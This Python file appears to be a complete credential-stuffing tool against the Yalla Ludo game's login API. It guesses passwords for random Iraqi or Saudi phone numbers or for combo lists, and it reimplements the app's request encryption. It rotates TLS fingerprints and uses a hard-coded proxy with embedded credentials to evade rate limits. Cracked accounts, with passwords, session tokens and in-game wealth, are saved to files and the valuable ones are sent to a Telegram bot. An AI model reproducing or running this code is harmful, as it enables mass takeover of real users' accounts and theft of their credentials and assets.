import os
import sys
import json
import base64
import time
import signal
import threading
import hashlib
import random
import uuid
from datetime import datetime
from queue import Queue, Empty

from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad

try:
    import tls_client
except ImportError:
    print("[-] pip install tls_client")
    sys.exit(1)

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass


class C:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BOLD = "\033[1m"


PROXY = "http://R:eecd7b5204a28b47f7cc34c67357433608726564666c61672e79617a616562616c73796164656c617470726f78792e766970@dc-us.kocerroxy.net:1153"

WORKING_FPS = [
    "confirmed_ios",
    "zalando_ios_mobile",
    "nike_ios_mobile",
    "okhttp4_android_9",
    "okhttp4_android_8",
    "mesh_ios_1",
]

LBP_HOSTS = [
    "https://account.carrstuv.com",
    "https://account.yalla.games",
    "https://account.lampjkl.com",
    "https://dtslave.yalla.games",
    "https://clog.yalla.games",
]
LBP_PATH = "/YallaGame/V2/AccountRelation/LoginByMobilePwd"
LBP_VER = "1.2.0.2"
LBP_UA = "YallaLudoHD-Android-187853807"
LBP_XOR_KEY = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
LBP_RSA_B64 = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAik19fj8zJnG7Ub50NvgLObo7KWkEQgXd7AcK9KsIETw/IvCsNc3SsbZq"
    "K9qpb+Ulv4kKMe1L6249+3fMLLzSpLtsb2k0cyRk3eKW0uyj8483HI2iSvAr1DIgNzvUXMbIAXSizw4IMQAejUKRbLh4w+lKVW"
    "U/6nSuMZNhpzswNPJqegItrEhIRK0tQ78W0lhFCvS3ggRbbFN7Oh/CNM843ZvS9tiFPS66kmmjimxxyAXKAPXvuMfJ9wuLXdke"
    "Bob87uGV16yW74835pux0GSRbHSmsNaZiZ5KJBkSEOE1HDsaYiSUQz3ByGGBnw9nah91ZnXxYuk55JvWcyg+Wuv9RwIDAQAB"
)
LBP_TIMEOUT = 20

PROFILE_PATH = "/YallaGame/V2/AccountRelation/AccountProfileInfo/"
PROFILE_VERSION = "1.2.6.1"
PROFILE_UA = "YallaLudo 1.2.6.1(Build 1020602)Android 34"
SIGN_SECRET = "LudoTokenSecurityCode"
PROFILE_RSA_B64 = LBP_RSA_B64

IRAQ = {
    "name": "Iraq",
    "code": "964",
    "prefixes": [
        "750", "751",
        "760",
        "770", "771", "772", "773", "774",
        "775", "776", "777", "778",
        "780", "781", "782", "783",
        "784", "785", "786", "787", "788", "789",
        "790", "791", "792", "793", "794",
        "795", "796", "797", "798", "799",
    ],
    "digits": 7,
}

SAUDI = {
    "name": "Saudi",
    "code": "966",
    "prefixes": ["050", "053", "054", "055", "056", "057", "058", "059"],
    "digits": 7,
}

iraq_passwords = [
    "12345qwert",
    "asdf1234",
    "qwer1234",
    "1234qwer",
    "qwert12345",
    "1q2w3e4r",
]

saudi_passwords = ["Ff123456", "Aa12341234", "Ss123456", "Aa123456", "Aa112233", "Nn112233"]

passwords = iraq_passwords

resultDir = "result"
fileBads = "result/bads.txt"
fileHitsCombo = "result/hits.txt"
fileHitsFull = "result/hits_full.txt"
fileSessions = "result/sessions.txt"
dirHitsGold = "HITS GOLD"
dirHitsDiamond = "HITS DIAMOND"
dirHitsLevel = "HITS LEVEL"
dirShowNumID = "SHOW NUM ID"
dirHitsVIP = "HITS VIP"
fileID7 = "showNumId_7.txt"
fileID6 = "showNumId_6.txt"
fileIDLess6 = "showNumId_less6.txt"
fileVIP = "vip.txt"
fileNoInfo = "noinfo.txt"
telegramConfigFile = "telegram.json"


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.good = 0
        self.wrong_pass = 0
        self.not_registered = 0
        self.errors = 0
        self.rate_limited = 0
        self.gold0 = 0
        self.gold100k = 0
        self.gold500k = 0
        self.gold1m = 0
        self.gold10m = 0
        self.dia0 = 0
        self.dia500 = 0
        self.dia1k = 0
        self.dia10k = 0
        self.lvl0 = 0
        self.lvl20 = 0
        self.lvl35 = 0
        self.lvl50 = 0
        self.id8 = 0
        self.id7 = 0
        self.id6 = 0
        self.id_less6 = 0
        self.vip = 0
        self.no_profile = 0


stats = Stats()
stop_flag = threading.Event()
saved_hits = set()
saved_bads = set()
saved_cat = set()
tested_numbers = set()
saved_lock = threading.Lock()
saved_cat_lock = threading.Lock()
tested_lock = threading.Lock()
print_lock = threading.Lock()
scan_mode_label = "Random"
country_mode = "IQ"
country_info = IRAQ
country_label = "Iraq (+964)"
bot_token = ""
chat_id = ""

_local = threading.local()


def lbp_session():
    s = getattr(_local, "s", None)
    if s is None:
        s = tls_client.Session(
            client_identifier=random.choice(WORKING_FPS),
            random_tls_extension_order=True,
        )
        _local.s = s
    return s


def get_md5(text):
    return hashlib.md5(text.encode("utf-8")).hexdigest()


def get_md5_upper(text):
    return hashlib.md5(text.encode("utf-8")).hexdigest().upper()


def build_login_req(mobile, password, area_code="964"):
    pl = {
        "mobile": mobile,
        "areaCode": area_code,
        "password": get_md5(password),
        "languageId": 1,
    }
    ak = base64.b64encode(os.urandom(24)).decode()
    akb = ak.encode()
    iv = os.urandom(16)
    pj = base64.b64encode(
        iv + AES.new(akb, AES.MODE_CBC, iv).encrypt(
            pad(json.dumps(pl, separators=(",", ":"), ensure_ascii=False).encode(), 16)
        )
    ).decode()
    nonce = os.urandom(16).hex() + "_" + "".join(
        random.choices(__import__("string").ascii_letters + __import__("string").digits, k=15)
    )
    bp = {
        "timeSpan": int(time.time() * 1000),
        "nonce": nonce,
        "token": "",
        "version": LBP_VER,
        "plateType": 1,
        "deviceType": 4,
    }
    bpj = base64.b64encode(
        iv + AES.new(akb, AES.MODE_CBC, iv).encrypt(
            pad(json.dumps(bp, separators=(",", ":"), ensure_ascii=False).encode(), 16)
        )
    ).decode()
    rk = RSA.import_key(base64.b64decode(LBP_RSA_B64))
    bf = base64.b64encode(PKCS1_v1_5.new(rk).encrypt(ak.encode())).decode()
    headers = {
        "user-agent": LBP_UA,
        "accept": "*/*",
        "content-type": "application/json",
        "blowfishstring": bf,
        "baseparamstring": bpj,
        "version": LBP_VER,
        "x-unity-version": "2022.3.62f2c1",
    }
    body = json.dumps({"paramJsonString": pj}, separators=(",", ":")).encode()
    return headers, body


def parse_login(raw):
    try:
        data = json.loads(raw)
    except Exception:
        return {"status": "ERROR"}
    pm = data.get("paramJsonString", "")
    if pm:
        try:
            rb = base64.b64decode(pm)
            data = json.loads(
                bytes(v ^ LBP_XOR_KEY[i % len(LBP_XOR_KEY)] for i, v in enumerate(rb)).decode("utf-8")
            )
        except Exception:
            return {"status": "ERROR"}
    rc = str(data.get("resultCode", ""))
    d = data.get("data") or {}
    if rc == "200" and d.get("token"):
        dv = str(d.get("isNeedDeviceVerify", "")).lower() in ("1", "true")
        return {"status": "VALID", "data": d, "device_verify": dv}
    if rc == "307":
        return {"status": "WRONG"}
    if rc == "303":
        return {"status": "NOTREG"}
    if rc == "206":
        return {"status": "ILLEGAL"}
    return {"status": "UNKNOWN", "code": rc, "msg": str(data.get("resultMsg", ""))[:80]}


def lbp_login(mobile, password, area_code="964"):
    s = lbp_session()
    for host in LBP_HOSTS:
        try:
            headers, body = build_login_req(mobile, password, area_code=area_code)
            r = s.post(
                host + LBP_PATH,
                data=body,
                headers=headers,
                timeout_seconds=LBP_TIMEOUT,
                proxy=PROXY,
            )
            if r.status_code == 429:
                with stats.lock:
                    stats.rate_limited += 1
                continue
            if r.status_code != 200:
                continue
            if b"DOCTYPE" in r.content[:30]:
                continue
            return parse_login(r.content)
        except Exception:
            continue
    return {"status": "ERROR"}


def build_profile_req(token, uid):
    ts = int(time.time() * 1000)
    sign = hashlib.md5(f"{token}|{ts}|{SIGN_SECRET}".encode()).hexdigest().upper()
    payload = {
        "token": token,
        "timeSpan": str(ts),
        "sign": sign,
        "plateType": 1,
        "version": PROFILE_VERSION,
    }
    try:
        payload["accountId"] = int(uid)
    except Exception:
        payload["accountId"] = uid

    ak = base64.b64encode(os.urandom(24)).decode()
    akb = ak.encode()
    iv = os.urandom(16)
    pj = base64.b64encode(
        iv + AES.new(akb, AES.MODE_CBC, iv).encrypt(
            pad(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode(), 16)
        )
    ).decode()

    device_id = getattr(_local, "device_id", None)
    if device_id is None:
        device_id = str(uuid.uuid4())
        _local.device_id = device_id

    nonce = device_id + "_" + base64.b32encode(os.urandom(9)).decode()[:15]
    bp = {
        "timeSpan": int(time.time() * 1000),
        "nonce": nonce,
        "token": token,
        "version": PROFILE_VERSION,
        "plateType": 1,
        "deviceType": 4,
    }
    bpj = base64.b64encode(
        iv + AES.new(akb, AES.MODE_CBC, iv).encrypt(
            pad(json.dumps(bp, separators=(",", ":"), ensure_ascii=False).encode(), 16)
        )
    ).decode()

    rk = RSA.import_key(base64.b64decode(PROFILE_RSA_B64))
    bf = base64.b64encode(PKCS1_v1_5.new(rk).encrypt(ak.encode())).decode()

    headers = {
        "user-agent": PROFILE_UA,
        "userid": str(uid),
        "blowfishstring": bf,
        "baseparamstring": bpj,
        "content-type": "application/json; charset=utf-8",
        "accept-encoding": "gzip",
        "x-access-token": token,
        "accessId": get_md5_upper(str(uid)),
    }
    body = json.dumps({"paramJsonString": pj}, separators=(",", ":")).encode()
    return headers, body


def do_profile(token, uid):
    s = lbp_session()
    for host in LBP_HOSTS:
        try:
            headers, body = build_profile_req(token, uid)
            r = s.post(
                host + PROFILE_PATH,
                data=body,
                headers=headers,
                timeout_seconds=LBP_TIMEOUT,
                proxy=PROXY,
            )
            if r.status_code != 200:
                continue
            try:
                data = json.loads(r.text)
            except Exception:
                continue
            rc = str(data.get("resultCode", "")).strip()
            if rc == "200":
                return data
        except Exception:
            continue
    return None


PROFILE_WANTED = [
    "levelId", "level", "vipLevel", "isVip", "starNum", "startNum",
    "goldNum", "diamondNum", "gameTotalCount", "exp", "showNumId",
]


def extract_wanted(obj):
    out = {}

    def walk(v):
        if isinstance(v, dict):
            for k, val in v.items():
                if k in PROFILE_WANTED and k not in out:
                    out[k] = val
                walk(val)
        elif isinstance(v, list):
            for e in v:
                walk(e)

    walk(obj)
    return out


def to_int(v):
    try:
        if isinstance(v, str):
            return int(float(v.strip()))
        return int(v)
    except Exception:
        return 0


def to_bool(v):
    if isinstance(v, bool):
        return v
    if isinstance(v, str):
        return v.strip().lower() in ("true", "1", "yes")
    if isinstance(v, (int, float)):
        return v != 0
    return False


def format_num(v):
    if isinstance(v, str):
        return v.strip()
    if isinstance(v, float):
        return str(int(v))
    return str(v)


def parse_account(fields):
    return {
        "valid": False,
        "levelId": to_int(fields.get("levelId", 0)),
        "level": to_int(fields.get("level", 0)),
        "vipLevel": to_int(fields.get("vipLevel", 0)),
        "isVip": to_bool(fields.get("isVip", False)),
        "starNum": to_int(fields.get("starNum", 0)),
        "startNum": to_int(fields.get("startNum", 0)),
        "goldNum": to_int(fields.get("goldNum", 0)),
        "diamondNum": to_int(fields.get("diamondNum", 0)),
        "gameTotalCount": to_int(fields.get("gameTotalCount", 0)),
        "exp": to_int(fields.get("exp", 0)),
        "showNumId": format_num(fields.get("showNumId", "")),
    }


def init_result_dir():
    os.makedirs(resultDir, exist_ok=True)


def init_category_dirs():
    for d in [dirHitsGold, dirHitsDiamond, dirHitsLevel, dirShowNumID, dirHitsVIP]:
        os.makedirs(os.path.join(resultDir, d), exist_ok=True)


def load_existing_category_saves():
    init_category_dirs()
    with saved_cat_lock:
        for d in [dirHitsGold, dirHitsDiamond, dirHitsLevel, dirShowNumID, dirHitsVIP]:
            full = os.path.join(resultDir, d)
            if not os.path.isdir(full):
                continue
            for fname in os.listdir(full):
                fpath = os.path.join(full, fname)
                if not os.path.isfile(fpath):
                    continue
                try:
                    with open(fpath, "r", encoding="utf-8") as f:
                        for line in f:
                            line = line.strip()
                            if line.startswith("Phone: "):
                                phone = line[7:].strip()
                                if phone:
                                    saved_cat.add(f"{d}/{fname}|{phone}")
                except Exception:
                    pass


def load_existing_saved_accounts():
    init_result_dir()
    with saved_lock:
        if os.path.isfile(fileHitsCombo):
            try:
                with open(fileHitsCombo, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            saved_hits.add(line)
            except Exception:
                pass
        if os.path.isfile(fileBads):
            try:
                with open(fileBads, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            saved_bads.add(line)
            except Exception:
                pass


def save_hit(phone, pwd, name, uid, token, profile):
    key = f"{phone}:{pwd}"
    with saved_lock:
        if key in saved_hits:
            return False
        saved_hits.add(key)
    init_result_dir()
    try:
        with open(fileHitsCombo, "a", encoding="utf-8") as f:
            f.write(f"{phone}:{pwd}\n")
    except Exception:
        pass
    try:
        with open(fileHitsFull, "a", encoding="utf-8") as f:
            f.write(
                f"Country: {country_label}\n"
                f"Phone: {phone}\nPass: {pwd}\nName: {name}\nID: {uid}\n"
                f"Token: {token}\nProfile: {profile}\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                + "=" * 50 + "\n"
            )
    except Exception:
        pass
    try:
        with open(fileSessions, "a", encoding="utf-8") as f:
            f.write(f"{phone}|{uid}|{name}|{token}\n")
    except Exception:
        pass
    return True


def save_bad(phone, pwd):
    key = f"{phone}:{pwd}"
    with saved_lock:
        if key in saved_bads:
            return
        saved_bads.add(key)
    init_result_dir()
    try:
        with open(fileBads, "a", encoding="utf-8") as f:
            f.write(f"{phone}:{pwd}\n")
    except Exception:
        pass


def append_account_file(sub_dir, filename, entry, phone):
    key = f"{sub_dir}/{filename}|{phone}"
    with saved_cat_lock:
        if key in saved_cat:
            return
        saved_cat.add(key)
    d = os.path.join(resultDir, sub_dir) if sub_dir else resultDir
    os.makedirs(d, exist_ok=True)
    try:
        with open(os.path.join(d, filename), "a", encoding="utf-8") as f:
            f.write(entry)
    except Exception:
        pass


def gold_bucket(g):
    if g < 100000:
        return "less_100k"
    if g < 500000:
        return "100k_500k"
    if g < 1000000:
        return "500k_1m"
    if g < 10000000:
        return "1m_10m"
    return "over_10m"


def diamond_bucket(d):
    if d < 500:
        return "less_500"
    if d < 1000:
        return "500_1k"
    if d < 10000:
        return "1k_10k"
    return "over_10k"


def level_bucket(l):
    if l < 20:
        return "less_20"
    if l <= 35:
        return "20_35"
    if l <= 50:
        return "35_50"
    return "over_50"


def shownumid_digits(s):
    s = str(s).strip().lstrip("0")
    return len(s) if s else 0


def build_account_entry(phone, pwd, name, uid, token, acct):
    summary = (
        f"level:{acct['levelId']} | VIP:{acct['isVip']} | startNum:{acct['startNum']} | "
        f"goldNum:{acct['goldNum']} | diamondNum:{acct['diamondNum']} | "
        f"Game Total Count: {acct['gameTotalCount']}"
    )
    return (
        f"Phone: {phone}\nPass: {pwd}\nName: {name}\nID: {uid}\n"
        f"showNumId: {acct['showNumId']}\n{summary}\nLevel: {acct['level']}\n"
        f"VipLevel: {acct['vipLevel']}\nStarNum: {acct['starNum']}\n"
        f"Gold: {acct['goldNum']}\nDiamond: {acct['diamondNum']}\n"
        f"Game Total Count: {acct['gameTotalCount']}\nExp: {acct['exp']}\n"
        f"Token: {token}\nCountry: {country_label}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "-" * 40 + "\n"
    )


def save_categorized(phone, pwd, name, uid, token, acct):
    if not acct.get("valid"):
        return
    entry = build_account_entry(phone, pwd, name, uid, token, acct)
    append_account_file(dirHitsGold, gold_bucket(acct["goldNum"]) + ".txt", entry, phone)
    append_account_file(dirHitsDiamond, diamond_bucket(acct["diamondNum"]) + ".txt", entry, phone)
    append_account_file(dirHitsLevel, level_bucket(acct["levelId"]) + ".txt", entry, phone)
    d = shownumid_digits(acct["showNumId"])
    if d == 7:
        append_account_file(dirShowNumID, fileID7, entry, phone)
    elif d == 6:
        append_account_file(dirShowNumID, fileID6, entry, phone)
    elif 0 < d < 6:
        append_account_file(dirShowNumID, fileIDLess6, entry, phone)
    if acct["isVip"]:
        append_account_file(dirHitsVIP, fileVIP, entry, phone)


def save_no_info(phone, pwd, name, uid, token):
    entry = (
        f"Phone: {phone}\nPass: {pwd}\nName: {name}\nID: {uid}\nToken: {token}\n"
        f"Country: {country_label}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "-" * 40 + "\n"
    )
    append_account_file("", fileNoInfo, entry, phone)


def update_stats(acct):
    with stats.lock:
        gb = gold_bucket(acct["goldNum"])
        if gb == "less_100k":
            stats.gold0 += 1
        elif gb == "100k_500k":
            stats.gold100k += 1
        elif gb == "500k_1m":
            stats.gold500k += 1
        elif gb == "1m_10m":
            stats.gold1m += 1
        else:
            stats.gold10m += 1
        db = diamond_bucket(acct["diamondNum"])
        if db == "less_500":
            stats.dia0 += 1
        elif db == "500_1k":
            stats.dia500 += 1
        elif db == "1k_10k":
            stats.dia1k += 1
        else:
            stats.dia10k += 1
        lb = level_bucket(acct["levelId"])
        if lb == "less_20":
            stats.lvl0 += 1
        elif lb == "20_35":
            stats.lvl20 += 1
        elif lb == "35_50":
            stats.lvl35 += 1
        else:
            stats.lvl50 += 1
        d = shownumid_digits(acct["showNumId"])
        if d >= 8:
            stats.id8 += 1
        elif d == 7:
            stats.id7 += 1
        elif d == 6:
            stats.id6 += 1
        elif d > 0:
            stats.id_less6 += 1
        if acct["isVip"]:
            stats.vip += 1


def load_tg():
    if os.path.isfile(telegramConfigFile):
        try:
            with open(telegramConfigFile, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"bot_token": "", "chat_id": ""}


def save_tg(cfg):
    try:
        with open(telegramConfigFile, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


def send_tg(phone, pwd, name, uid, token, reasons):
    if not bot_token or not chat_id or not reasons:
        return
    flag = "🇮🇶" if country_mode == "IQ" else "🇸🇦"
    lines = [
        f"{flag} Country: {country_label}",
        f"Phone: {phone}",
        f"Pass: {pwd}",
        f"Name: {name}",
        f"ID: {uid}",
        f"Token: {token}",
        "",
    ] + reasons + ["", "By:@is71s"]
    try:
        tls_client.Session().post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            json={"chat_id": chat_id, "text": "\n".join(lines)},
            timeout_seconds=10,
        )
    except Exception:
        pass


def tg_reasons(acct):
    if not acct.get("valid"):
        return []
    out = []
    if acct["goldNum"] >= 1000000:
        out.append(f"Gold: {acct['goldNum']}")
    if acct["diamondNum"] >= 1000:
        out.append(f"Diamond: {acct['diamondNum']}")
    if shownumid_digits(acct["showNumId"]) == 6:
        out.append(f"ID: {acct['showNumId']}")
    if acct["levelId"] >= 50:
        out.append(f"Level: {acct['levelId']}")
    if acct["isVip"]:
        out.append("VIP:TRUE")
    return out


def process_login(mobile, pwd, verdict):
    if not isinstance(verdict, dict):
        return -1

    st = verdict.get("status")

    if st == "VALID":
        d = verdict.get("data") or {}
        name = d.get("name", "") or ""
        uid = d.get("id", "") or ""
        token = d.get("token", "") or ""

        acct = {"valid": False}
        profile_info = ""
        if token and uid:
            prof = do_profile(token, uid)
            if prof and isinstance(prof, dict) and str(prof.get("resultCode")) == "200":
                fields = extract_wanted(prof)
                if fields:
                    acct = parse_account(fields)
                    acct["valid"] = True
                    profile_info = json.dumps(fields, ensure_ascii=False)

        with stats.lock:
            stats.good += 1

        if acct.get("valid"):
            update_stats(acct)
            save_categorized(mobile, pwd, name, uid, token, acct)
        else:
            with stats.lock:
                stats.no_profile += 1
            save_no_info(mobile, pwd, name, uid, token)

        save_hit(mobile, pwd, name, uid, token, profile_info)
        reasons = tg_reasons(acct)
        if reasons:
            send_tg(mobile, pwd, name, uid, token, reasons)
        return 0

    if st == "WRONG":
        save_bad(mobile, pwd)
        return 1

    if st == "NOTREG":
        save_bad(mobile, pwd)
        with stats.lock:
            stats.not_registered += 1
        return 2

    with stats.lock:
        stats.errors += 1
    return -1


def check_number(mobile):
    if stop_flag.is_set():
        return
    for pwd in passwords:
        if stop_flag.is_set():
            return
        v = lbp_login(mobile, pwd, area_code=country_info["code"])
        if v is None:
            continue
        res = process_login(mobile, pwd, v)
        if res in (0, 2, -1):
            with stats.lock:
                stats.total += 1
            return
    with stats.lock:
        stats.wrong_pass += 1
        stats.total += 1


def check_combo(combo):
    if stop_flag.is_set():
        return
    parts = combo.split(":", 1)
    if len(parts) != 2:
        return
    mobile = parts[0].strip().lstrip("0")
    pwd = parts[1].strip()
    if not mobile or not pwd:
        return
    if mobile.startswith(country_info["code"]):
        mobile = mobile[len(country_info["code"]):]

    v = lbp_login(mobile, pwd, area_code=country_info["code"])
    with stats.lock:
        stats.total += 1
    if v is None:
        with stats.lock:
            stats.errors += 1
        return
    res = process_login(mobile, pwd, v)
    if res == 1:
        with stats.lock:
            stats.wrong_pass += 1


def load_combos(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []


def print_logo():
    print(f"{C.RED}{C.BOLD}")
    print(r"""
 __     __    _ _         _               _         ____        
 \ \   / /_ _| | | __ _  | |   _   _   __| | ___   / ___| ___   
  \ \ / / _' | | |/ _' | | |  | | | | / _' |/ _ \ | |  _ / _ \  
   \ V / (_| | | | (_| | | |__| |_| || (_| | (_) || |_| | (_) | 
    \_/ \__,_|_|_|\__,_| |_____\__,_| \__,_|\___/  \____|\___/  
                                            [ High Speed Python ]""")
    print(f"{C.RESET}")


def print_dashboard(threads, rps, cpm):
    sys.stdout.write("\033[H\033[J")
    print_logo()

    with stats.lock:
        t = stats.total
        g = stats.good
        w = stats.wrong_pass
        nr = stats.not_registered
        e = stats.errors
        rl = stats.rate_limited
        g0, g1, g2, g3, g4 = stats.gold0, stats.gold100k, stats.gold500k, stats.gold1m, stats.gold10m
        d0, d1, d2, d3 = stats.dia0, stats.dia500, stats.dia1k, stats.dia10k
        l0, l1, l2, l3 = stats.lvl0, stats.lvl20, stats.lvl35, stats.lvl50
        id8, id7, id6, idl, vip, nop = stats.id8, stats.id7, stats.id6, stats.id_less6, stats.vip, stats.no_profile

    lines = []
    lines.append(f"{C.CYAN}{C.BOLD}================================================================={C.RESET}")
    lines.append(f" {C.CYAN}Target :{C.RESET} {C.BOLD}{country_label}{C.RESET}  |  {C.CYAN}Mode :{C.RESET} {C.YELLOW}{scan_mode_label}{C.RESET}  |  {C.CYAN}Threads :{C.RESET} {C.YELLOW}{threads}{C.RESET}  |  {C.CYAN}Proxy :{C.RESET} {C.GREEN}ON{C.RESET}")
    lines.append(f"{C.CYAN}================================================================={C.RESET}")
    lines.append(f" Total: {C.WHITE}{t}{C.RESET}  |  {C.GREEN}HIT: {g}{C.RESET}  |  {C.YELLOW}Wrong: {w}{C.RESET}  |  {C.RED}NotReg: {nr}{C.RESET}  |  {C.WHITE}Err: {e}{C.RESET}  |  {C.RED}429: {rl}{C.RESET}")
    lines.append(f" {C.CYAN}Speed :{C.RESET} {C.BOLD}{C.GREEN}{rps:.0f} RPS{C.RESET} ({C.YELLOW}{cpm:.0f} CPM{C.RESET})")
    lines.append(f"{C.CYAN}================================================================={C.RESET}")
    lines.append(f"{C.YELLOW}{C.BOLD} GOLD{C.RESET}")
    lines.append(f"  {'< 100K':<12} | [ {g0} ]     {'100K-500K':<12} | [ {g1} ]")
    lines.append(f"  {'500K-1M':<12} | [ {g2} ]     {'1M-10M':<12} | [ {g3} ]")
    lines.append(f"  {'10M+':<12} | [ {g4} ]")
    lines.append(f"{C.CYAN}================================================================={C.RESET}")
    lines.append(f"{C.YELLOW}{C.BOLD} DIAMOND{C.RESET}")
    lines.append(f"  {'< 500':<12} | [ {d0} ]     {'500-1K':<12} | [ {d1} ]")
    lines.append(f"  {'1K-10K':<12} | [ {d2} ]     {'10K+':<12} | [ {d3} ]")
    lines.append(f"{C.CYAN}================================================================={C.RESET}")
    lines.append(f"{C.YELLOW}{C.BOLD} LEVEL{C.RESET}")
    lines.append(f"  {'< 20':<12} | [ {l0} ]     {'20-35':<12} | [ {l1} ]")
    lines.append(f"  {'35-50':<12} | [ {l2} ]     {'50+':<12} | [ {l3} ]")
    lines.append(f"{C.CYAN}================================================================={C.RESET}")
    lines.append(f"{C.YELLOW}{C.BOLD} ID / VIP{C.RESET}")
    lines.append(f"  {'ID 8':<12} | [ {id8} ]     {'ID 7':<12} | [ {id7} ]")
    lines.append(f"  {'ID 6':<12} | [ {id6} ]     {'ID <6':<12} | [ {idl} ]")
    lines.append(f"  {'VIP':<12} | [ {vip} ]     {'NoProfile':<12} | [ {nop} ]")
    lines.append(f"{C.CYAN}================================================================={C.RESET}")
    lines.append(" Press Ctrl+C to stop")

    with print_lock:
        sys.stdout.write("\n".join(lines) + "\n")
        sys.stdout.flush()


def dashboard_loop(threads):
    last_total = 0
    last_time = time.time()
    rps = cpm = 0.0
    while not stop_flag.is_set():
        with stats.lock:
            cur = stats.total
        now = time.time()
        elapsed = now - last_time
        if elapsed >= 0.8:
            delta = cur - last_total
            rps = delta / elapsed
            cpm = rps * 60.0
            last_total = cur
            last_time = now
        print_dashboard(threads, rps, cpm)
        time.sleep(1)


def generate_number():
    return random.choice(country_info["prefixes"]) + "".join(
        str(random.randint(0, 9)) for _ in range(country_info["digits"])
    )


def worker_loop(jobs_queue, mode):
    while not stop_flag.is_set():
        try:
            job = jobs_queue.get(timeout=0.1)
        except Empty:
            continue
        try:
            if mode == 1:
                check_number(job)
            else:
                check_combo(job)
        except Exception:
            pass


def main():
    global scan_mode_label, bot_token, chat_id, country_mode, country_info, country_label, passwords

    print_logo()
    load_existing_saved_accounts()
    load_existing_category_saves()

    print(f"{C.YELLOW}======================================================={C.RESET}")
    print("        SELECT COUNTRY:")
    print(f" {C.CYAN}[{C.GREEN}1{C.CYAN}]{C.RESET} Iraq    (+964)")
    print(f" {C.CYAN}[{C.GREEN}2{C.CYAN}]{C.RESET} Saudi   (+966)")
    print(f"{C.YELLOW}======================================================={C.RESET}")

    cc = "1"
    while True:
        try:
            cc = input(f"{C.YELLOW}\n Enter country (1-2) [default: 1]: {C.RESET}").strip()
        except EOFError:
            cc = "1"
        if cc in ("", "1", "2"):
            break
        print(f"{C.RED} Invalid!{C.RESET}")

    if cc == "2":
        country_mode = "SA"
        country_info = SAUDI
        country_label = "Saudi (+966)"
        passwords = saudi_passwords
    else:
        country_mode = "IQ"
        country_info = IRAQ
        country_label = "Iraq (+964)"
        passwords = iraq_passwords

    print(f"{C.GREEN}{C.BOLD} Target: {country_label}{C.RESET}\n")

    print(f"{C.YELLOW}======================================================={C.RESET}")
    print("        SELECT SCANNING MODE:")
    print(f" {C.CYAN}[{C.GREEN}1{C.CYAN}]{C.RESET} Random Mode")
    print(f" {C.CYAN}[{C.GREEN}2{C.CYAN}]{C.RESET} Combo Mode")
    print(f"{C.YELLOW}======================================================={C.RESET}")

    mode = 1
    while True:
        try:
            m_str = input(f"{C.YELLOW}\n Enter mode (1-2) [default: 1]: {C.RESET}").strip()
        except EOFError:
            m_str = ""
        if m_str == "":
            break
        if m_str in ("1", "2"):
            mode = int(m_str)
            break
        print(f"{C.RED} Invalid!{C.RESET}")

    combos = []
    if mode == 2:
        while True:
            try:
                path = input(" Combo file path: ").strip()
            except EOFError:
                path = ""
            combos = load_combos(path)
            if combos:
                print(f"{C.GREEN} Loaded {len(combos)} combos{C.RESET}")
                break
            print(f"{C.RED} Could not load!{C.RESET}")
        if not combos:
            return

    scan_mode_label = "Random" if mode == 1 else f"Combo ({len(combos)})"

    try:
        t_str = input(" Threads [default: 50]: ").strip()
    except EOFError:
        t_str = ""
    threads = 50
    if t_str:
        try:
            t = int(t_str)
            if t > 0:
                threads = t
        except Exception:
            pass

    tg = load_tg()
    if not (tg.get("bot_token") and tg.get("chat_id")):
        if not tg.get("bot_token"):
            try:
                tg["bot_token"] = input(" Bot Token (leave empty to skip): ").strip()
            except EOFError:
                tg["bot_token"] = ""
        if not tg.get("chat_id"):
            try:
                tg["chat_id"] = input(" Chat ID (leave empty to skip): ").strip()
            except EOFError:
                tg["chat_id"] = ""
        if tg.get("bot_token") and tg.get("chat_id"):
            save_tg(tg)
    bot_token = tg.get("bot_token", "")
    chat_id = tg.get("chat_id", "")

    print(f"{C.CYAN}\n Starting {threads} workers...{C.RESET}")
    time.sleep(1.5)

    threading.Thread(target=dashboard_loop, args=(threads,), daemon=True).start()

    def sig_handler(signum, frame):
        stop_flag.set()

    signal.signal(signal.SIGINT, sig_handler)
    try:
        signal.signal(signal.SIGTERM, sig_handler)
    except Exception:
        pass

    jobs_queue = Queue(maxsize=threads * 4)

    for _ in range(threads):
        threading.Thread(target=worker_loop, args=(jobs_queue, mode), daemon=True).start()

    if mode == 1:
        while not stop_flag.is_set():
            mobile = generate_number()
            with tested_lock:
                if mobile in tested_numbers:
                    continue
                tested_numbers.add(mobile)
            try:
                jobs_queue.put(mobile, timeout=0.1)
            except Exception:
                pass
    else:
        seen = set()
        for combo in combos:
            if stop_flag.is_set():
                break
            if combo in seen:
                continue
            seen.add(combo)
            try:
                jobs_queue.put(combo, timeout=1.0)
            except Exception:
                pass
        while not stop_flag.is_set():
            time.sleep(0.5)

    stop_flag.set()
    time.sleep(1)
    with print_lock:
        print(f"\n{C.GREEN}Done.{C.RESET} Total: {stats.total} HIT: {stats.good} Wrong: {stats.wrong_pass} NotReg: {stats.not_registered} Errors: {stats.errors} 429: {stats.rate_limited}")
        print(f"Results saved to folder: {resultDir}/")


if __name__ == "__main__":
    main()